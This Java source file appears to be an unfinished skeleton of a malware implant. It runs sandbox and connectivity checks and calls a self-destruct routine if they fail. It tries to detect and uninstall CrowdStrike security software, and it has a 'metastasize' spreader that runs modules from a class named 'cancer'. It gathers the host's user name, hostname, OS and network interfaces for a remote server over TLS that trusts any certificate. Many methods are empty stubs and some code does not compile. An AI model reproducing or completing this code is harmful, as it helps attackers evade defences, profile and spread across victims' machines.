import java.io.BufferedReader;
import java.io.FileReader;
import java.io.StringWriter;
import java.lang.reflect.Array;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Hashtable;
import java.util.Arrays;
import org.w3c.dom.Document;
import org.w3c.dom.Element;

import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.ParserConfigurationException;
import javax.xml.transform.dom.DOMSource;
import javax.xml.transform.*;
import javax.xml.transform.stream.StreamResult;
import java.net.UnknownHostException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.SecretKey;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import javax.swing.text.html.HTMLEditorKit.Parser;

import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;

import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;

class nConfig
{
    public static int locTcpPort = 49602;
    public static String encKey = "";
    public static int metastasize = 0;
    public static String uri = "";
    public static int isKeystone = 0;
    public static int stutterMin = 10;
    public static int stutterMax = 50;
    public static String struck = "false";
}

public class nCore
{
    public static void Main(String[] args)
    {
        
        //convert to threadable once main loop has been tested

        //check if the program can reach out and if it's in a sandbox
        countermeasures cm = new countermeasures();

        if (!keepalive() || cm.chkSandbox())
        {
            cm.spoliate();
        }

        //check if crowdstrike is installed and attempt uninstall if it is
        if (cm.getCStrike())
        {
            nConfig.struck = String.valueOf(cm.counterStrike());
        }

        modLib.getUpdate();

        //execute initial 
        //start loop
        react("metadata");
    }

    public static boolean keepalive()
    {
        //5 tries to checkin
        network nComm = new network();
        for (int c=0; c<5; c++)
        try
        {
            nComm.request();
        }
        catch
        {

        }

    }

    public static void react(String methodName)
    {
        //exec method, uses threader, loops to keepalive
        // 1. recv cmd
        // 2. modsearch
        // 3. thread mod if extant
        // 4. attempt to pull if not
    }

    public static void threader()
    {

    }

    //need class getter

    static class modLib
    {
        public static void getUpdate()
        {

        }

        public class autoLib
        {
            private void metastasize()
            {
                utilitarian nUtil = new utilitarian();
                
                ArrayList<Method> methList = nUtil.getClassMethods("modLib.autoLib.cancer");
                for (int a=0; a<methList.size(); a++)
                {
                    //need to put the code to thread in here
                    threader();
                }
                // spreader governor module, searches the autolib inner class cancer for any modules other than itself and runs them
            }

            class cancer
            {
                //currently empty, populated when modules updated
            }
        }

        private class genLib
        {
            private Document metadata() throws SocketException, UnknownHostException, ParserConfigurationException
            {
                Hashtable<String,String> metadata = new Hashtable<>();
                utilitarian nUtil = new utilitarian();

                metadata.put("arch",System.getProperty("os.arch"));
                metadata.put("os",System.getProperty("os.name"));
                metadata.put("version",System.getProperty("os.version"));
                metadata.put("user",System.getProperty("user.name"));
                metadata.put("cwd",System.getProperty("user.dir"));
                metadata.put("jre",System.getProperty("java.runtime.version"));
                metadata.put("interfaces",nUtil.getAddress().toString());
                metadata.put("hostname",nUtil.getHostname());
                metadata.put("crowdstruck",nConfig.struck);

                return nUtil.outputToXmlDoc("metadata",metadata);
            }
        }

        private class nixLib
        {
            //currently empty, populated when modules updated
        }

        private class winLib
        {
            //currently empty, populated when modules updated
        }


    } 

    private static class utilitarian
    {

        private Method getMethodByName(String methodName)
        {
            
        }

        private Class getClassByName(String className)
        {

        }

        private ArrayList<Method> getClassMethods(String className)
        {

        }

        private String xmlDocToString(Document xmlDoc) throws TransformerException
        {
            TransformerFactory tFacInst = TransformerFactory.newInstance();
            Transformer tFac = tFacInst.newTransformer();
            StringWriter stWrite = new StringWriter();
            tFac.transform(new DOMSource(xmlDoc), new StreamResult(stWrite));
            return stWrite.toString();
        }

        private Document outputToXmlDoc(String rootName, Hashtable<String,String> output) throws ParserConfigurationException
        {
            DocumentBuilderFactory manufactorum = DocumentBuilderFactory.newInstance();
            DocumentBuilder constructor = manufactorum.newDocumentBuilder();

            Document doc = constructor.newDocument();

            Element root = doc.createElement(rootName);
            doc.appendChild(root);
        
            Enumeration<String> k = output.keys();

            while (k.hasMoreElements())
            {
                String key = k.nextElement();
                Element kElement = doc.createElement("data");
                kElement.setAttribute(
                    key.toString(),
                    output.get(key.toString())
                );
                root.appendChild(kElement);
            }

            return doc;
        }

        //copied from my lycanthropy project
        private String getHostname() throws UnknownHostException {
            String deviceName = new String();
                try {
                    InetAddress ipAddress = InetAddress.getLocalHost();
                    deviceName = ipAddress.getHostName();
                } catch (Exception e) {
                    String envVar = new String();
                    try {
                        if (System.getProperty("os.name").contains("Win")) {
                            deviceName = System.getenv("COMPUTERNAME");
                        } else {
                            StringBuilder fileString = new StringBuilder();
                            BufferedReader fileReader = new BufferedReader(new FileReader("/proc/sys/kernel/hostname"));
                            String nextLine = fileReader.readLine();
                            while (nextLine != null) {
                                fileString.append(nextLine);
                                nextLine = fileReader.readLine();
                            }
                            deviceName = fileString.toString();
                        }
                    } catch (Exception f) {
                        deviceName = "na";
                    }
                }
                return deviceName;
        }
        
        //copied from my lycanthropy project
        private Hashtable getAddress() throws SocketException {
            Hashtable interfaceMap = new Hashtable();
            Enumeration interfaces = NetworkInterface.getNetworkInterfaces();
            while(interfaces.hasMoreElements()) {
                ArrayList<String> addressList = new ArrayList<String>();
                NetworkInterface interfaceObject = (NetworkInterface) interfaces.nextElement();
                Enumeration addresses = interfaceObject.getInetAddresses();
                while(addresses.hasMoreElements()) {
                    InetAddress addressObject = (InetAddress) addresses.nextElement();
                    addressList.add(addressObject.getHostAddress());
                }
                interfaceMap.put(interfaceObject.getName(),addressList.toString());
            }
            return interfaceMap;
        }
    }

    private class network
    {
        private byte[] request(String postData) throws NoSuchAlgorithmException, KeyManagementException
        {
            //stackoverflow provided boilerplate
            SSLContext sslCon = SSLContext.getInstance("TLS");
            sslCon.init(null, new TrustManager[] {new InvalidCertificateTrustManager()}, null);

        }

        private Hashtable auReq(String Data)
        {

        }

        //stackoverflow
        public class InvalidCertificateTrustManager implements X509TrustManager{
            @Override
            public X509Certificate[] getAcceptedIssuers() {
                return null;
            }

            @Override
            public void checkServerTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {

            }

            @Override
            public void checkClientTrusted(X509Certificate[] paramArrayOfX509Certificate, String paramString) throws CertificateException {
            }
        }
    }

    private static class countermeasures
    {
        private boolean chkSandbox()
        {

        }

        private boolean spoliate()
        {

        }

        private boolean counterStrike()
        {

        }

        private boolean getCStrike()
        {

        }
    }

    private class security
    {
        private byte[] encrypt()
        {

        }

        private byte[] decrypt()
        {

        }

        private SecretKey init() throws Exception
        {
    
        }
    
        private byte[] doWork(byte[] plaintext, byte[] nonce, int mode) throws Exception
        {

        }
    }
}